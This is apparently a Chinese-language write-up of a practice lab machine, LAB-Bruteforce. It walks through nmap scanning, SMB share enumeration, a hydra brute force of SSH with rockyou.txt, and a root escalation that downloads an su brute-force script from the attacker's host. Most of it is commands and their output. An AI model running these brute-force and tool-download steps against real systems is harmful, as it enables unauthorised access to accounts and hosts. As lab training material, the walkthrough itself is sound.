# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 11:08 EDT
Nmap scan report for 192.168.21.9
Host is up (0.00023s latency).
MAC Address: 08:00:27:9A:95:2E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 6.20 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.9 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 11:09 EDT
Nmap scan report for 192.168.21.9
Host is up (0.00043s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
19000/tcp open  igrid
19222/tcp open  unknown
MAC Address: 08:00:27:9A:95:2E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.9
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 11:09 EDT
Warning: 192.168.21.9 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.9
Host is up (0.0013s latency).
Not shown: 65454 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT      STATE SERVICE
137/udp   open  netbios-ns
5353/udp  open  zeroconf
10000/udp open  ndmp
MAC Address: 08:00:27:9A:95:2E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 73.05 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O -p22,10000,19000,19222 192.168.21.9
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 11:11 EDT
Nmap scan report for 192.168.21.9
Host is up (0.00028s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
10000/tcp open  http        MiniServ 2.021 (Webmin httpd)
19000/tcp open  netbios-ssn Samba smbd 4
19222/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:9A:95:2E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.35 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU -sV -O -p137,5353,10000 192.168.21.9
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 11:13 EDT
Nmap scan report for 192.168.21.9
Host is up (0.00031s latency).

PORT      STATE SERVICE    VERSION
137/udp   open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
5353/udp  open  mdns       DNS-based service discovery
10000/udp open  webmin     (https on TCP port 10000 ())
MAC Address: 08:00:27:9A:95:2E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop
Service Info: Host: LAB-BRUTEFORCE

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
```

# 漏洞利用

描述提示：Intended for practicing bruteforce and SMB service exploitation.
看一下smb服务

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L //192.168.21.9// -p 19000
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Test            Disk      
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.21.9 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
                                                                
┌──(kali㉿kali)-[~]
└─$ smbclient -L //192.168.21.9// -p 19222
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Test            Disk      
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.21.9 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.21.9/test -p 19000
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar 26 15:06:46 2023
  ..                                  D        0  Sun Mar 26 14:12:02 2023
  README.txt                          N      115  Sun Mar 26 15:06:46 2023

                9232860 blocks of size 1024. 3049248 blocks available
smb: \> get README.txt
getting file \README.txt of size 115 as README.txt (56.1 KiloBytes/sec) (average 56.2 KiloBytes/sec)
smb: \> exit
┌──(kali㉿kali)-[~]
└─$ cat README.txt    
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly
```

得到用户名Andrea，尝试爆破ssh

```
┌──(kali㉿kali)-[~]
└─$ hydra -l andrea -P /usr/share/wordlists/rockyou.txt ssh://192.168.21.9 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-18 11:47:10
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.21.9:22/
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active
[STATUS] 61.33 tries/min, 184 tries in 00:03h, 14344215 to do in 3897:54h, 4 active
[STATUS] 63.71 tries/min, 446 tries in 00:07h, 14343953 to do in 3752:10h, 4 active
[22][ssh] host: 192.168.21.9   login: andrea   password: awesome
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-18 12:00:45
```

ssh链接

```
┌──(kali㉿kali)-[~]
└─$ ssh andrea@192.168.21.9               
The authenticity of host '192.168.21.9 (192.168.21.9)' can't be established.
ED25519 key fingerprint is SHA256:jxCJlAEwfgAbyE4RC2RJnQM/Y0rUXe+Yt6q7Y69okUg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.9' (ED25519) to the list of known hosts.
andrea@192.168.21.9's password: 
Linux LAB-Bruteforce 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 26 21:26:42 2023 from 192.168.1.84
andrea@LAB-Bruteforce:~$
```

# 权限提升

```
andrea@LAB-Bruteforce:~$ wget http://192.168.21.10/suForce.sh
--2025-08-18 18:08:59--  http://192.168.21.10/suForce.sh
Connecting to 192.168.21.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2430 (2.4K) [text/x-sh]
Saving to: ‘suForce.sh’

suForce.sh      100%[=======>]   2.37K  --.-KB/s    in 0s      

2025-08-18 18:08:59 (50.1 MB/s) - ‘suForce.sh’ saved [2430/2430]

andrea@LAB-Bruteforce:~$ chmod +x suForce.sh
andrea@LAB-Bruteforce:~$ wget http://192.168.21.10/rockyou.txt
--2025-08-18 18:14:24--  http://192.168.21.10/rockyou.txt
Connecting to 192.168.21.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 139921507 (133M) [text/plain]
Saving to: ‘rockyou.txt’

rockyou.txt     100%[=======>] 133.44M   211MB/s    in 0.6s    

2025-08-18 18:14:24 (211 MB/s) - ‘rockyou.txt’ saved [139921507/139921507]
//复制出错了....
./suForce.sh -u root -w rockyou.txt跑出root密码
完成提权
```
